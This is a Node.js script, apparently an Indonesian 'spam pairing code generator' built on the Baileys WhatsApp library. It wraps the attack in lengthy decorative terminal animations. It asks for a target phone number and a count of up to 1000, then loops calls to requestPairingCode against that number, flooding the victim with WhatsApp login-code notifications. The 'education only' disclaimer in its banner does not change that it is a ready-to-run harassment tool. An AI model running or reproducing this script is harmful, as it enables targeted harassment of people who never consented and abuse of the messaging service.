const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const colors = {
    red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m', blue: '\x1b[34m',
    magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m', gray: '\x1b[90m',
    reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m'
};

const rainbow = ['\x1b[31m', '\x1b[33m', '\x1b[32m', '\x1b[36m', '\x1b[34m', '\x1b[35m', '\x1b[91m', '\x1b[93m'];

const frames = {
    spinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
    dots: ['∙∙∙', '●∙∙', '∙●∙', '∙∙●', '∙∙∙'],
    wave: ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█', '▇', '▆', '▅', '▄', '▃', '▂'],
    square: ['◰', '◳', '◲', '◱'],
    circle: ['◐', '◓', '◑', '◒'],
    arrow: ['←', '↖', '↑', '↗', '→', '↘', '↓', '↙'],
    bounce: ['⠁', '⠂', '⠄', '⡀', '⢀', '⠠', '⠐', '⠈']
};

class UltraAnimator {
    constructor() { this.intervals = []; this.timeouts = []; }
    
    clearAll() { this.intervals.forEach(clearInterval); this.timeouts.forEach(clearTimeout); this.intervals = []; this.timeouts = []; }
    
    rainbowText(text, speed = 100) {
        return new Promise((resolve) => {
            let i = 0;
            const frames = [];
            for (let f = 0; f < rainbow.length; f++) {
                let frame = '';
                for (let c = 0; c < text.length; c++) {
                    frame += rainbow[(f + c) % rainbow.length] + text[c];
                }
                frames.push(frame + colors.reset);
            }
            const animate = () => {
                readline.cursorTo(process.stdout, 0);
                process.stdout.write(frames[i % frames.length]);
                i++;
                if (i < 50) {
                    this.timeouts.push(setTimeout(animate, speed));
                } else {
                    readline.cursorTo(process.stdout, 0);
                    process.stdout.write(text + colors.reset);
                    resolve();
                }
            };
            animate();
        });
    }
    
    matrixRain(lines = 10, duration = 3000) {
        const chars = '01';
        const cols = process.stdout.columns || 80;
        const drops = Array(cols).fill(0);
        const startTime = Date.now();
        
        const interval = setInterval(() => {
            process.stdout.write('\x1b[32m');
            for (let i = 0; i < cols; i++) {
                const char = chars[Math.floor(Math.random() * chars.length)];
                process.stdout.write(char);
                drops[i] = (drops[i] + 1) % lines;
            }
            if (Date.now() - startTime > duration) {
                clearInterval(interval);
                process.stdout.write('\x1b[0m\n');
            }
        }, 50);
        this.intervals.push(interval);
    }
    
    particleExplosion(text, duration = 2000) {
        const particles = ['✦', '✧', '❖', '❀', '✣', '✤', '✥', '✺', '✻', '✼', '✽', '❃', '❋'];
        const cols = process.stdout.columns || 80;
        const rows = 10;
        const grid = Array(rows).fill().map(() => Array(cols).fill(' '));
        const centerX = Math.floor(cols / 2);
        const centerY = Math.floor(rows / 2);
        
        text.split('').forEach((char, i) => {
            const x = centerX - Math.floor(text.length / 2) + i;
            if (x >= 0 && x < cols) grid[centerY][x] = char;
        });
        
        const startTime = Date.now();
        const interval = setInterval(() => {
            console.clear();
            const time = Date.now() - startTime;
            const progress = Math.min(time / duration, 1);
            
            for (let y = 0; y < rows; y++) {
                let line = '';
                for (let x = 0; x < cols; x++) {
                    if (grid[y][x] !== ' ') {
                        const colorIndex = Math.floor((x + y + time/100) % rainbow.length);
                        line += rainbow[colorIndex] + grid[y][x] + colors.reset;
                    } else if (Math.random() < 0.1 * progress) {
                        const particle = particles[Math.floor(Math.random() * particles.length)];
                        const colorIndex = Math.floor(Math.random() * rainbow.length);
                        line += rainbow[colorIndex] + particle + colors.reset;
                    } else {
                        line += ' ';
                    }
                }
                console.log(line);
            }
            
            if (progress >= 1) {
                clearInterval(interval);
                console.clear();
            }
        }, 100);
        this.intervals.push(interval);
    }
    
    glitchText(text, iterations = 20) {
        const glitchChars = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`';
        return new Promise((resolve) => {
            let i = 0;
            const animate = () => {
                let glitched = '';
                for (let j = 0; j < text.length; j++) {
                    if (Math.random() < 0.3 && i < iterations - 5) {
                        glitched += colors.red + glitchChars[Math.floor(Math.random() * glitchChars.length)] + colors.reset;
                    } else {
                        const color = rainbow[(j + i) % rainbow.length];
                        glitched += color + text[j] + colors.reset;
                    }
                }
                readline.cursorTo(process.stdout, 0);
                process.stdout.write(glitched);
                i++;
                if (i < iterations) {
                    this.timeouts.push(setTimeout(animate, 80));
                } else {
                    readline.cursorTo(process.stdout, 0);
                    process.stdout.write(text + colors.reset + '\n');
                    resolve();
                }
            };
            animate();
        });
    }
    
    loadingBar(total, text = '') {
        return {
            update: (current) => {
                const width = 40;
                const percent = current / total;
                const filled = Math.round(width * percent);
                const bar = colors.green + '█'.repeat(filled) + colors.gray + '░'.repeat(width - filled) + colors.reset;
                const percentText = Math.round(percent * 100);
                const spinner = frames.spinner[current % frames.spinner.length];
                
                readline.cursorTo(process.stdout, 0);
                process.stdout.write(`${spinner} ${bar} ${percentText}% ${text}`);
                
                if (current >= total) {
                    readline.cursorTo(process.stdout, 0);
                    process.stdout.write(colors.green + '✓' + colors.reset + ' ' + colors.green + '█'.repeat(width) + colors.reset + ` 100% ${text}\n`);
                }
            }
        };
    }
    
    typewriter(text, delay = 30) {
        return new Promise((resolve) => {
            let i = 0;
            process.stdout.write(colors.cyan);
            
            const type = () => {
                if (i < text.length) {
                    process.stdout.write(text.charAt(i));
                    i++;
                    this.timeouts.push(setTimeout(type, delay));
                } else {
                    process.stdout.write(colors.reset);
                    resolve();
                }
            };
            type();
        });
    }
}

const anim = new UltraAnimator();

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { 
        rl.question(colors.cyan + text + colors.reset, (answer) => { rl.close(); resolve(answer); });
    });
};

async function epicEntrance() {
    console.clear();
    
    await anim.matrixRain(15, 2000);
    await new Promise(r => setTimeout(r, 500));
    console.clear();
    
    const title = "██████╗ ██████╗  █████╗ ██╗███████╗███╗   ██╗ ██████╗ ███████╗";
    const title2 = "██╔══██╗██╔══██╗██╔══██╗██║██╔════╝████╗  ██║██╔════╝ ██╔════╝";
    const title3 = "██████╔╝██████╔╝███████║██║█████╗  ██╔██╗ ██║██║  ███╗█████╗  ";
    const title4 = "██╔═══╝ ██╔══██╗██╔══██║██║██╔══╝  ██║╚██╗██║██║   ██║██╔══╝  ";
    const title5 = "██║     ██║  ██║██║  ██║██║███████╗██║ ╚████║╚██████╔╝███████╗";
    const title6 = "╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝";
    
    console.log('\n'.repeat(2));
    await anim.glitchText(title, 25);
    await anim.glitchText(title2, 25);
    await anim.glitchText(title3, 25);
    await anim.glitchText(title4, 25);
    await anim.glitchText(title5, 25);
    await anim.glitchText(title6, 25);
    
    console.log('\n');
    await anim.particleExplosion("SPAM PAIRING CODE GENERATOR", 2500);
    console.clear();
    
    const subtitle = "╔══════════════════════════════════════════════════════════════╗";
    const subtitle2 = "║                    ULTIMATE SPAM TOOL v3.0                  ║";
    const subtitle3 = "║              🔥 RENOVASI BY: RIM 🔥                       ║";
    const subtitle4 = "║              👑 ORIGINAL BY: FLOWFALCON 👑                 ║";
    const subtitle5 = "╚══════════════════════════════════════════════════════════════╝";
    
    console.log('\n'.repeat(3));
    await anim.typewriter(subtitle, 10);
    await anim.typewriter(subtitle2, 10);
    await anim.typewriter(subtitle3, 10);
    await anim.typewriter(subtitle4, 10);
    await anim.typewriter(subtitle5, 10);
    
    console.log('\n');
    await anim.rainbowText("=".repeat(65));
    
    const warning = "╔══════════════════════════════════════════════════════════════╗";
    const warning2 = "║  ⚠️   HANYA UNTUK EDUKASI - JANGAN DISALAHGUNAKAN!   ⚠️     ║";
    const warning3 = "╚══════════════════════════════════════════════════════════════╝";
    
    console.log('\n');
    console.log(colors.red + warning + colors.reset);
    console.log(colors.yellow + warning2 + colors.reset);
    console.log(colors.red + warning3 + colors.reset);
    
    console.log('\n');
    await anim.typewriter(colors.cyan + "🎯 " + colors.reset + colors.bright + "TEKAN ENTER UNTUK MEMULAI" + colors.reset, 40);
    await question('');
    console.clear();
}

async function KleeProject() {
    await epicEntrance();
    
    console.log(colors.cyan + "\n" + "=".repeat(65) + colors.reset);
    await anim.typewriter(colors.green + "📡 MEMUAT MODUL SPAM PAIRING..." + colors.reset, 20);
    console.log(colors.cyan + "=".repeat(65) + colors.reset + "\n");
    
    try {
        const { state } = await useMultiFileAuthState('./69/session');
        const KleeBotInc = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            auth: state,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 10000,
            emitOwnEvents: true,
            fireInitQueries: true,
            generateHighQualityLinkPreview: true,
            syncFullHistory: true,
            markOnlineOnConnect: true,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
        });
        
        await anim.typewriter(colors.magenta + "\n" + "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰" + colors.reset, 5);
        console.log(colors.yellow + "\n🔥 MASUKKAN DETAIL TARGET 🔥" + colors.reset);
        await anim.typewriter(colors.magenta + "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰" + colors.reset + "\n", 5);
        
        const phoneNumber = await question(colors.cyan + "📞 NOMOR TARGET (62xxxxxxxxxx): " + colors.reset);
        if (!phoneNumber.startsWith('62')) {
            console.log(colors.red + "\n❌ HARUS DIAWALI 62! CONTOH: 6281234567890" + colors.reset);
            return;
        }
        
        console.log('\n');
        const KleeCodes = parseInt(await question(colors.cyan + "💣 JUMLAH SPAM (1-1000): " + colors.reset));
        if (isNaN(KleeCodes) || KleeCodes <= 0 || KleeCodes > 1000) {
            console.log(colors.red + "\n❌ MIN 1, MAX 1000!" + colors.reset);
            return;
        }
        
        console.clear();
        await anim.particleExplosion(`MULAI SPAM KE: ${phoneNumber}`, 1500);
        console.clear();
        
        console.log(colors.green + "\n" + "█".repeat(65) + colors.reset);
        console.log(colors.bright + colors.yellow + "                 🚀 SPAM DIMULAI! 🚀" + colors.reset);
        console.log(colors.green + "█".repeat(65) + colors.reset);
        
        const loading = anim.loadingBar(KleeCodes, colors.cyan + "Mengirim kode..." + colors.reset);
        
        let sukses = 0;
        let gagal = 0;
        const codes = [];
        
        for (let i = 0; i < KleeCodes; i++) {
            loading.update(i);
            
            try {
                let code = await KleeBotInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                codes.push(code);
                sukses++;
                
                console.log(colors.green + `\n✅ [${i+1}/${KleeCodes}] TERKIRIM → ${code}` + colors.reset);
                console.log(colors.dim + `   📍 Target: ${phoneNumber} | Status: SUCCESS` + colors.reset);
                
                const emotes = ['✨', '🎯', '⚡', '💥', '🌟', '🔥', '🎪', '🌈', '💫', '🦄'];
                const randomEmote = emotes[Math.floor(Math.random() * emotes.length)];
                console.log(colors.magenta + `   ${randomEmote} Kode berhasil terkirim!` + colors.reset);
                
            } catch (error) {
                gagal++;
                console.log(colors.red + `\n❌ [${i+1}/${KleeCodes}] GAGAL → ${error.message}` + colors.reset);
                console.log(colors.dim + `   📍 Target: ${phoneNumber} | Status: FAILED` + colors.reset);
            }
            
            await new Promise(r => setTimeout(r, 800));
        }
        
        loading.update(KleeCodes);
        anim.clearAll();
        
        console.clear();
        console.log(colors.cyan + "\n" + "╔" + "═".repeat(63) + "╗" + colors.reset);
        console.log(colors.bright + colors.yellow + "                    📊 LAPORAN FINAL 📊" + colors.reset);
        console.log(colors.cyan + "╚" + "═".repeat(63) + "╝" + colors.reset);
        
        console.log(colors.green + `\n✅ SUCCESS: ${sukses} kode pairing` + colors.reset);
        console.log(colors.red + `❌ FAILED: ${gagal} kode` + colors.reset);
        console.log(colors.blue + `📈 TOTAL: ${KleeCodes} permintaan` + colors.reset);
        
        const rate = ((sukses / KleeCodes) * 100).toFixed(1);
        console.log(colors.magenta + `🎯 SUCCESS RATE: ${rate}%` + colors.reset);
        
        if (codes.length > 0) {
            console.log(colors.cyan + "\n📋 KODE YANG BERHASIL TERKIRIM:" + colors.reset);
            codes.forEach((code, idx) => {
                const color = rainbow[idx % rainbow.length];
                console.log(color + `   ${idx+1}. ${code}` + colors.reset);
            });
        }
        
        console.log(colors.yellow + "\n" + "═".repeat(65) + colors.reset);
        console.log(colors.green + "🎉 PROSES SPAM SELESAI!" + colors.reset);
        console.log(colors.cyan + "🛠️  Renovasi oleh: RIM" + colors.reset);
        console.log(colors.magenta + "👑 Original by: FlowFalcon" + colors.reset);
        console.log(colors.yellow + "═".repeat(65) + colors.reset);
        
        await anim.rainbowText("\n🔥 TERIMAKASIH TELAH MENGGUNAKAN TOOL INI! 🔥", 100);
        
        console.log('\n');
        for (let i = 0; i < 10; i++) {
            let fireworks = '';
            for (let j = 0; j < 20; j++) {
                fireworks += ['🎆', '🎇', '✨', '🌟', '💥', '⭐', '🌈', '💫'][Math.floor(Math.random() * 8)];
            }
            console.log(rainbow[i % rainbow.length] + fireworks + colors.reset);
            await new Promise(r => setTimeout(r, 200));
        }
        
    } catch (error) {
        anim.clearAll();
        console.log(colors.red + `\n💀 ERROR KRITIS: ${error.message}` + colors.reset);
        console.log(colors.yellow + "🔧 Periksa koneksi internet dan session folder!" + colors.reset);
    }
}

console.clear();
setTimeout(() => KleeProject(), 500);
